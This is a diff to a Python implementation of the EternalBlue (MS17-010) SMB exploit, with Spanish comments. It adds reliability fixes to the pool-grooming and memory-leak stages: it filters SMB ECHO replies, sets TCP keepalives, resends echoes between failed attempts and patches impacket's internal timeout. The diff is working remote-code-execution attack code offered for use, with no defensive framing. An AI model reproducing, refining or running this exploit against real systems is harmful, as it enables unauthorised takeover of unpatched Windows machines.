@@ -22,6 +22,7 @@ import struct
 import socket
 import random
 import time
+import threading
 
 _ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 if _ROOT not in sys.path:
@@ -240,12 +241,22 @@ def _build_mysmb_class():
             """
             Recibe datos de una transacción SMB, acumulando hasta tener minLen bytes.
             Filtra por MID para asegurar que es la respuesta correcta.
+            Ignora SESSION_KEEP_ALIVE de NetBIOS y respuestas ECHO del servidor.
             Portado de helviojunior/MS17-010/mysmb.py.
             """
             from impacket import smb as _smb
+            # SMB_COM_ECHO = 0x2B — respuestas de echo pueden intercalarse
+            SMB_COM_ECHO = 0x2B
             data = b''
             while len(data) < minLen:
                 recvPkt = self.recvSMB()
+                # Ignorar respuestas ECHO (keepalive) que no son parte de la transacción
+                try:
+                    cmd = recvPkt['Command']
+                    if cmd == SMB_COM_ECHO:
+                        continue
+                except Exception:
+                    pass
                 if recvPkt['Mid'] != mid:
                     continue
                 resp = _smb.SMBCommand(recvPkt['Data'][0])
@@ -629,6 +640,35 @@ def _align_and_leak(conn, tid, fid, info, numFill=4):
     }
 
 
+class _KeepAlive:
+    """
+    Mantiene viva la conexión SMB durante el pool grooming enviando TCP keepalives
+    a nivel de socket (SO_KEEPALIVE) en lugar de paquetes SMB — así no interfiere
+    con los recvSMB del grooming principal.
+    """
+    def __init__(self, conn, interval=15):
+        self._conn = conn
+        self._interval = interval
+
+    def start(self):
+        try:
+            s = self._conn.get_socket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            # Linux: primer keepalive tras interval s, cada interval s, 5 reintentos
+            if hasattr(socket, 'TCP_KEEPIDLE'):
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, self._interval)
+            if hasattr(socket, 'TCP_KEEPINTVL'):
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, self._interval)
+            if hasattr(socket, 'TCP_KEEPCNT'):
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
+        except Exception:
+            pass
+        return self
+
+    def stop(self):
+        pass  # los keepalives del SO se desactivan solos al cerrar el socket
+
+
 def _exploit_matched_pairs(conn, pipe_name, info):
     """Método matched pairs — Windows 7/2008R2 y posteriores (incluido 2012 R2)."""
     tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\IPC$')
@@ -645,14 +685,22 @@ def _exploit_matched_pairs(conn, pipe_name, info):
     info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
     info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']
 
+    # Keepalive a nivel TCP: evita que firewalls/routers corten la conexión idle
+    ka = _KeepAlive(conn, interval=15).start()
+
     leakInfo = None
     for i in range(10):
         _reset_extra_mid(conn)
         leakInfo = _align_and_leak(conn, tid, fid, info)
         if leakInfo is not None:
             break
+        # Entre intentos fallidos: reconectar tree y mandar echo para mantener sesión SMB viva
         conn.close(tid, fid)
         conn.disconnect_tree(tid)
+        try:
+            conn.send_echo(b'\x00')
+        except Exception:
+            pass
         tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\IPC$')
         conn.set_default_tid(tid)
         fid = conn.nt_create_andx(tid, pipe_name)
@@ -902,9 +950,10 @@ def _eternalblue_exploit(target, port, cmd, timeout=60, user='', password='', do
     console.print(f"  [dim]Usando pipe: {pipe_name}[/dim]")
 
     console.print("  [dim]Iniciando pool grooming...[/dim]")
-    # El grooming envía/recibe muchos paquetes; subir el timeout del socket
-    # para que ningún recv individual expire durante la operación.
+    # impacket guarda el timeout en _SMB__timeout (name-mangled) y lo pasa a recv_packet.
+    # Hay que parchearlo directamente para que recvSMB no expire durante el grooming.
     try:
+        conn._SMB__timeout = 300
         conn.get_socket().settimeout(300)
     except Exception:
         pass
